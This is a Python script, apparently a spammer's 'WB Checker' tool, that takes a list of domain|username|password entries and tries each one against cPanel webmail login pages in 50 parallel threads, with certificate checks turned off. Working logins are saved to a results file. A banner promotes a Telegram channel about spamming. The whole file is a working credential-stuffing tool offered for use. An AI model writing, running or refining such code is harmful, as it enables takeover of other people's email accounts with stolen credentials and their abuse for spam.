import os
import sys
import concurrent.futures
import colorama
import requests
from colorama import Fore, Style
import threading
import urllib3
import chardet

# Suppressing urllib3 warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

colorama.init(autoreset=True)

# Define colors for success and failure messages
g = Fore.GREEN
r = Fore.RED
b = Fore.BLUE

# Initializing a lock for thread-safe printing and file writing
lock = threading.Lock()

def ensure_dir(directory):
    """Ensure that a directory exists; if not, create it."""
    if not os.path.exists(directory):
        os.makedirs(directory)

# Make sure the Results directory exists
ensure_dir('Results')

def print_colored(message, color):
    print(color + message)

def wbcheck(url):
    try:
        domain, username, pwd = url.split("|")
        host = f"{domain}/login/?login_only=1"
        host = host.replace("http://", "https://").replace(":2095", ":2096")
        log = {'user': username, 'pass': pwd}
        req = requests.post(host, data=log, timeout=15, verify=False)
        
        if 'security_token' in req.text:
            with lock:
                print_colored(f"[+] {url}  ==> Webmail Login Successful!", g)
                with open('Results/Webmail_good.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
        else:
            with lock:
                print_colored(f"[+] {url}  ==> Webmail Login Invalid!", r)
                with open('Results/Webmail_bad.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
    except Exception as e:
        with lock:
            print_colored(f"[+] {url}  ==> Webmail Host Invalid", r)

def detect_encoding(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read(100000)
    result = chardet.detect(raw_data)
    return result['encoding']

def menu():
    banner_part1 = Fore.BLUE + """

    ██╗    ██╗██████╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
    ██║    ██║██╔══██╗    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██║ █╗ ██║██████╔╝    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
    ██║███╗██║██╔══██╗    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ╚███╔███╔╝██████╔╝    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
     ╚══╝╚══╝ ╚═════╝      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                              

    """

    banner_part2 = Fore.MAGENTA + """
    For more tools and info about spamming, 
    join my Telegram channel: @rrustemHEKRI_V2

    For direct contact and inquiries, 
    reach out to the owner Telegram: @rrustemHEKRI
    """

    # Printing the entire banner with color separation
    print(banner_part1 + banner_part2)
    
    try:
        file_path = input(f"{b}Provide Your List --> ")
        encoding = detect_encoding(file_path)
        with open(file_path, 'rt', encoding=encoding) as f:  # Use detected encoding
            url_list = f.read().splitlines()
        with concurrent.futures.ThreadPoolExecutor(50) as executor:
            executor.map(wbcheck, url_list)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        sys.exit(0)
